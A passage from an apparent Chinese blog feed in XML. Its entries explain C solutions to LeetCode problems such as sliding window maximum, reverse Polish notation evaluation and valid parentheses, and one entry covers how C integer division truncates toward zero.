class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li><p>实现主体函数，先使用<code>qsort</code>对原数组进行升序排序，使得相同值的元素相邻。</p></li><li><p>为结果数组<code>res</code>分配空间，给<code>*returnSize</code>赋值</p></li><li><p>定义结构体数组，使用<code>for</code>循环统计每个元素出现的个数</p></li><li><p>使用<code>qsort</code>对结构体的频率部分进行排序，最后将前k个结构体对应的元素值存入<code>res</code>中</p></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">map</span> {</span></span><br><span class="line">    <span class="type">int</span> ele; <span class="comment">//元素值</span></span><br><span class="line">    <span class="type">int</span> nu; <span class="comment">//记录次数</span></span><br><span class="line">} Map;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">cmp</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *a,<span class="type">const</span> <span class="type">void</span> *b)</span> {</span><br><span class="line"><span class="keyword">return</span> *(<span class="type">int</span>*)a-*(<span class="type">int</span>*)b;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">cmps</span><span class="params">(<span class="type">const</span> <span class="type">void</span>* a,<span class="type">const</span> <span class="type">void</span>* b)</span>{</span><br><span class="line">    <span class="keyword">return</span> (*(Map*)b).nu - (*(Map*)a).nu;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span>* <span class="title function_">topKFrequent</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> k, <span class="type">int</span>* returnSize)</span> {</span><br><span class="line">    </span><br><span class="line">    qsort(nums, numsSize, <span class="keyword">sizeof</span>(<span class="type">int</span>), cmp); <span class="comment">//升序排序</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> *res = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * k);</span><br><span class="line">    *returnSize = k;</span><br><span class="line"></span><br><span class="line">    Map <span class="built_in">map</span>[numsSize];</span><br><span class="line">    <span class="type">int</span> count=<span class="number">0</span>; <span class="comment">//记录结构体数组的下标</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">map</span>[<span class="number">0</span>].ele = nums[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">map</span>[<span class="number">0</span>].nu = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;numsSize; i++) { <span class="comment">//统计每个元素出现的频率</span></span><br><span class="line">        <span class="keyword">if</span>(nums[i<span class="number">-1</span>] == nums[i])</span><br><span class="line">            <span class="built_in">map</span>[count].nu++;</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            <span class="built_in">map</span>[++count].ele = nums[i];</span><br><span class="line">            <span class="built_in">map</span>[count].nu=<span class="number">1</span>;</span><br><span class="line">        }</span><br><span class="line">            </span><br><span class="line">    }</span><br><span class="line">    qsort(<span class="built_in">map</span>, count+<span class="number">1</span>, <span class="keyword">sizeof</span>(Map), cmps);  <span class="comment">//对频率进行排序</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;k; i++) {</span><br><span class="line">        res[i] = <span class="built_in">map</span>[i].ele;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>滑动窗口最大值</title>
    <link href="/2024/02/16/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E6%9C%80%E5%A4%A7%E5%80%BC/"/>
    <url>/2024/02/16/%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E6%9C%80%E5%A4%A7%E5%80%BC/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/sliding-window-maximum/</p><p>这题使用双循环暴力求解会超时，然后想了很久也没弄出来，看了题解也理解了半天。</p><blockquote><p>这题的一个重要知识点就是<strong>单调队列</strong>，<strong>即单调递减或单调递增的队列</strong>。</p></blockquote><p>思路如下：</p><ul><li>首先分配好结果数组<code>res</code>的空间大小<code>numsSize-k+1</code>，然后定义一个数组<code>queue</code>作为<strong>双端队列</strong>，该双端队列不是直接存放<code>nums</code>数组中的元素，而是存放对应元素的下标</li><li>通过循环先将前<code>k</code>个元素加入<code>queue</code>中，同时要保持该队列为<strong>单调递减队列</strong>，即<strong>入队元素</strong>大于<strong>队尾元素</strong>时，则从弹出队尾元素，直到入队元素小于队尾元素或队列为空，再将当前元素入队。（注意这里入队的是对应<strong>元素的下标</strong>，上述的描述是为了方便）</li><li>将第一个滑动窗口最大元素加入<code>res</code>中</li><li>通过循环将剩余元素入队，原理同第二步，入队后需要判断队中元素<strong>下标的范围是否大于滑动窗口大小</strong>。若大于，则弹出队头元素，队头下标增加，再将当前队头元素加入<code>res</code>中；否则直接将队头元素加入<code>res</code>中。（注意这里入队的是对应元素的下标）</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span>* <span class="title function_">maxSlidingWindow</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> k, <span class="type">int</span>* returnSize)</span> {</span><br><span class="line">    <span class="type">int</span> *res = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*(numsSize-k+<span class="number">1</span>)); <span class="comment">//存放各个滑动窗口的最大值</span></span><br><span class="line">    <span class="type">int</span> <span class="built_in">queue</span>[numsSize]; <span class="comment">//双端队列</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> front=<span class="number">0</span>, rear=<span class="number">0</span>; <span class="comment">//队头，队尾</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;k; i++) {</span><br><span class="line">        <span class="keyword">while</span>(rear&gt;<span class="number">0</span> &amp;&amp; nums[i]&gt;=nums[<span class="built_in">queue</span>[rear - <span class="number">1</span>]])</span><br><span class="line">            rear--; <span class="comment">//若入队元素不小于队尾元素，则从队尾出队</span></span><br><span class="line">        <span class="built_in">queue</span>[rear++] = i; <span class="comment">//否则入队(记录下标)，保持队内单调递减</span></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    *returnSize = <span class="number">0</span>;</span><br><span class="line">    res[(*returnSize)++] = nums[<span class="built_in">queue</span>[front]]; <span class="comment">//将前k个数中最大值存入res中</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//遍历剩余元素，每入队一个元素，则队头出队一个元素，保持滑动窗口大小</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=k; i&lt;numsSize; i++) { </span><br><span class="line">        <span class="keyword">while</span>(rear&gt;front &amp;&amp; nums[i]&gt;=nums[<span class="built_in">queue</span>[rear - <span class="number">1</span>]])</span><br><span class="line">            rear--; <span class="comment">//若入队元素不小于队尾元素，则从队尾出队</span></span><br><span class="line">        <span class="built_in">queue</span>[rear++] = i; <span class="comment">//否则入队，保持队内单调递减</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">queue</span>[rear<span class="number">-1</span>] - <span class="built_in">queue</span>[front] &gt;=  k) {</span><br><span class="line">            front++;</span><br><span class="line">        } <span class="comment">//若队头元素与队尾元素之差大于等于k，则队头元素需要出队</span></span><br><span class="line">        res[(*returnSize)++] = nums[<span class="built_in">queue</span>[front]];</span><br><span class="line">    }</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>独特的电子邮件地址</title>
    <link href="/2024/02/13/%E7%8B%AC%E7%89%B9%E7%9A%84%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E5%9C%B0%E5%9D%80/"/>
    <url>/2024/02/13/%E7%8B%AC%E7%89%B9%E7%9A%84%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6%E5%9C%B0%E5%9D%80/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/unique-email-addresses</p><p>这题在字符串的处理上不难，需要注意细节，例如<code>.</code>字符之后就是<code>@</code>字符，处理过程中注意数组下标的变化。通过这题我了解到了二重指针与二维数组的关系：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *emails[<span class="number">4</span>] = {<span class="string">"a@leetcode.com"</span>,<span class="string">"b@leetcode.com"</span>,<span class="string">"c@leetcode.com"</span>,<span class="string">"c.@leetcode.com"</span>};</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">emails[0] == "a@leetcode.com"，以此类推。</span></span><br><span class="line"><span class="comment">当 emails 作为参数时，如下：</span></span><br><span class="line"><span class="comment">int numUniqueEmails(char** emails, int emailsSize) </span></span><br><span class="line"><span class="comment">**/</span></span><br></pre></td></tr></tbody></table></figure><p>下面是我的解题思路：</p><ul><li>首先定义一个函数对特殊字符进行处理（注意数组下标的处理）</li><li>在<code>numUniqueEmails</code>函数中定义一个新的数组<code>processedEmails</code>存放处理后的邮箱地址</li><li>定义一个中间变量(字符串)<code>tmp</code>存放新处理的字符串，<code>count</code>为数组下标</li><li>将<code>tmp</code>与<code>processedEmails</code>中的字符串进行比较，若无相同的，则加入该数组，接着释放<code>tmp</code></li><li>最后返回<code>count</code>，然后释放<code>processedEmails</code>空间</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">remove_ele</span><span class="params">(<span class="type">char</span> *s, <span class="type">int</span> length, <span class="type">char</span> *result)</span> {</span><br><span class="line">    <span class="type">int</span> flag=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> x=<span class="number">0</span>; <span class="comment">// 位置指针</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;length; ) {</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">'@'</span>)</span><br><span class="line">            flag=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">'.'</span> &amp;&amp; flag==<span class="number">0</span>) {</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">continue</span>; <span class="comment">//若在'@'前遇到'.'，则需要忽略该字符</span></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">'+'</span> &amp;&amp; flag==<span class="number">0</span>) {</span><br><span class="line">            <span class="keyword">while</span>(s[i]!=<span class="string">'@'</span>)</span><br><span class="line">                i++; <span class="comment">//若在'@'前遇到'+'，则需要忽略该字符到'@'之前的字符</span></span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">'@'</span>)</span><br><span class="line">                flag=<span class="number">1</span>;</span><br><span class="line">        }</span><br><span class="line">        result[x++] = s[i++];</span><br><span class="line">    }</span><br><span class="line">    result[x] = <span class="string">'\0'</span>; <span class="comment">// 添加字符串结尾的 null 字符</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">numUniqueEmails</span><span class="params">(<span class="type">char</span>** emails, <span class="type">int</span> emailsSize)</span> {</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> *processedEmails[emailsSize]; <span class="comment">// 用于存储经过处理的邮箱地址</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; emailsSize; i++) {</span><br><span class="line">        <span class="comment">// 分配足够的内存来存储处理后的字符串</span></span><br><span class="line">        <span class="type">char</span> *tmp = <span class="built_in">malloc</span>(<span class="built_in">strlen</span>(emails[i]) + <span class="number">1</span>); </span><br><span class="line">        remove_ele(emails[i], <span class="built_in">strlen</span>(emails[i]), tmp);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, tmp);</span><br><span class="line">        <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; count; j++) {</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(tmp, processedEmails[j]) == <span class="number">0</span>) {</span><br><span class="line">                found = <span class="number">1</span>;  <span class="comment">//若有相同的字符串，则found=1，且退出循环</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span>(!found) {</span><br><span class="line">            processedEmails[count++] = tmp; <span class="comment">// 将处理后的字符串存储在数组中</span></span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="built_in">free</span>(tmp); <span class="comment">// 释放重复的邮箱地址的内存</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放所有未重复的邮箱地址的内存</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; count; i++) {</span><br><span class="line">        <span class="built_in">free</span>(processedEmails[i]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言中的整数除法</title>
    <link href="/2024/02/12/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E6%95%B4%E6%95%B0%E9%99%A4%E6%B3%95/"/>
    <url>/2024/02/12/C%E8%AF%AD%E8%A8%80%E4%B8%AD%E7%9A%84%E6%95%B4%E6%95%B0%E9%99%A4%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>向下取整的运算称为Floor，用数学符号⌊⌋表示；向上取整的运算称为Ceiling，用数学符号⌈⌉表示。</p><p>在C语言中整数除法取的既不是Floor也不是Ceiling，无论操作数是正是负总是把小数部分截掉，在<strong>数轴上向零的方向取整（TruncatetowardZero）</strong>，或者说当操作数为正的时候相当于Floor，当操作符为负的时候相当于Ceiling。例如：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">59</span> / <span class="number">60</span> = <span class="number">0</span>                 <span class="comment">//⌊59/60⌋=0      ⌈59/60⌉=1</span></span><br><span class="line"><span class="number">-59</span> / <span class="number">60</span> = <span class="number">0</span>                <span class="comment">//⌊-59/60⌋=-1    ⌈-59/60⌉=0</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">59</span> / <span class="number">58</span> = <span class="number">1</span></span><br><span class="line"><span class="number">-59</span> / <span class="number">58</span> = <span class="number">-1</span></span><br></pre></td></tr></tbody></table></figure><p>同时可以得到一个与取模运算有关的结论：%运算符的结果总是与被除数同号。例如：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">59</span> % <span class="number">60</span> = <span class="number">59</span></span><br><span class="line"><span class="number">-59</span> % <span class="number">60</span> = <span class="number">-59</span></span><br></pre></td></tr></tbody></table></figure><p>注意：Python中的整数除法和整数取模运算与C语言不完全相同。</p><p>参考：https://docs.huihoo.com/c/linux-c-programming/ch04s02.html</p>]]></content>
    
    
    <categories>
      
      <category>C</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>整数除法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>逆波兰表达式求值</title>
    <link href="/2024/02/12/%E9%80%86%E6%B3%A2%E5%85%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B1%82%E5%80%BC/"/>
    <url>/2024/02/12/%E9%80%86%E6%B3%A2%E5%85%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B1%82%E5%80%BC/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/evaluate-reverse-polish-notation/</p><p>逆波兰表达式就是<strong>后缀表达式</strong>，使用栈的思想：</p><ul><li>遍历后缀表达式</li><li>遇到数字则入栈</li><li>遇到操作符，则弹出栈顶两个数字进行运算，将该运算得到的结果入栈</li><li>重复上述操作</li></ul><blockquote><p>注：<code>tokens[i]</code>表示第i个字符串的地址，<code>tokens[i][0]</code>表示第i个字符串的第一个字符</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">isNumber</span><span class="params">(<span class="type">char</span>* token)</span> {</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strlen</span>(token) &gt; <span class="number">1</span> || (<span class="string">'0'</span> &lt;= token[<span class="number">0</span>] &amp;&amp; token[<span class="number">0</span>] &lt;= <span class="string">'9'</span>);</span><br><span class="line">} <span class="comment">//当字符串长度大于1，则该字符串是数字；或只有一位数</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">evalRPN</span><span class="params">(<span class="type">char</span>** tokens, <span class="type">int</span> tokensSize)</span> {</span><br><span class="line">    <span class="type">int</span> stk[tokensSize], top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; tokensSize; i++) {</span><br><span class="line">        <span class="type">char</span>* token = tokens[i]; <span class="comment">//第i个字符串的地址</span></span><br><span class="line">        <span class="keyword">if</span> (isNumber(token)) {</span><br><span class="line">            stk[top++] = atoi(token); <span class="comment">//atoi将字符串转为int型数字</span></span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="type">int</span> num2 = stk[--top];</span><br><span class="line">            <span class="type">int</span> num1 = stk[--top]; <span class="comment">//出栈</span></span><br><span class="line">            <span class="keyword">switch</span> (token[<span class="number">0</span>]) {</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'+'</span>:</span><br><span class="line">                    stk[top++] = num1 + num2;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'-'</span>:</span><br><span class="line">                    stk[top++] = num1 - num2;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'*'</span>:</span><br><span class="line">                    stk[top++] = num1 * num2;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">'/'</span>:</span><br><span class="line">                    stk[top++] = num1 / num2;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> stk[top - <span class="number">1</span>];</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>删除字符串中的所有相邻重复项</title>
    <link href="/2024/02/09/%E5%88%A0%E9%99%A4%E7%9B%B8%E9%82%BB%E9%87%8D%E5%A4%8D%E9%A1%B9/"/>
    <url>/2024/02/09/%E5%88%A0%E9%99%A4%E7%9B%B8%E9%82%BB%E9%87%8D%E5%A4%8D%E9%A1%B9/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/remove-all-adjacent-duplicates-in-string/</p><ul><li>定义一个辅助数组作为栈</li><li>将第一个字符入栈</li><li>使用for循环遍历给定的 s字符串，若当前遍历到的字符与栈顶字符相同，则出栈；若不同则入栈</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>* <span class="title function_">removeDuplicates</span><span class="params">(<span class="type">char</span>* s)</span> {</span><br><span class="line">    <span class="type">int</span> n = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="type">char</span> *t = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>)*(n+<span class="number">1</span>)); <span class="comment">//辅助数组作为栈</span></span><br><span class="line">    <span class="type">int</span> top=<span class="number">0</span>; <span class="comment">//栈顶</span></span><br><span class="line">    t[top++] = s[<span class="number">0</span>]; <span class="comment">//先将第一个字符入栈</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>; i&lt;<span class="built_in">strlen</span>(s); i++) {</span><br><span class="line">        <span class="keyword">if</span>(top&gt;<span class="number">0</span> &amp;&amp; s[i]==t[top<span class="number">-1</span>]) {</span><br><span class="line">            top--;</span><br><span class="line">        }  <span class="comment">//若s[i]与栈顶元素相同，则出栈</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            t[top++] =  s[i];</span><br><span class="line">    }</span><br><span class="line">    t[top] = <span class="string">'\0'</span>; <span class="comment">//截断字符串</span></span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>有效的括号</title>
    <link href="/2024/02/09/%E6%9C%89%E6%95%88%E7%9A%84%E6%8B%AC%E5%8F%B7/"/>
    <url>/2024/02/09/%E6%9C%89%E6%95%88%E7%9A%84%E6%8B%AC%E5%8F%B7/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/valid-parentheses/</p><p>有关括号匹配的题一般都是用栈来实现。</p><p>下面是我自己的代码，比较繁琐：</p><ul><li>遍历 s字符串，遇到左括号就入栈，遇到右括号则判断<strong>栈内是否为空</strong>，若不为空则<strong>判断栈顶元素</strong>是否为对应的右括号；若不满足条件则返回false ，满足条件则栈顶元素出栈</li><li>循环结束后判断栈内是否为空，若不为空（有多余的左括号）则返回false</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">isValid</span><span class="params">(<span class="type">char</span>* s)</span> {</span><br><span class="line">    <span class="type">char</span> tmp[<span class="number">10000</span>]; <span class="comment">//栈（暂存左括号）</span></span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="built_in">strlen</span>(s); i++) {</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">'('</span> || s[i]==<span class="string">'{'</span> || s[i]==<span class="string">'['</span>) {</span><br><span class="line">            tmp[j++] = s[i];</span><br><span class="line">        } <span class="comment">//左括号入栈</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">')'</span> &amp;&amp; (j&lt;=<span class="number">0</span> || tmp[j<span class="number">-1</span>]!=<span class="string">'('</span>)) {</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">'}'</span> &amp;&amp; (j&lt;=<span class="number">0</span> || tmp[j<span class="number">-1</span>]!=<span class="string">'{'</span>)) {</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">']'</span> &amp;&amp; 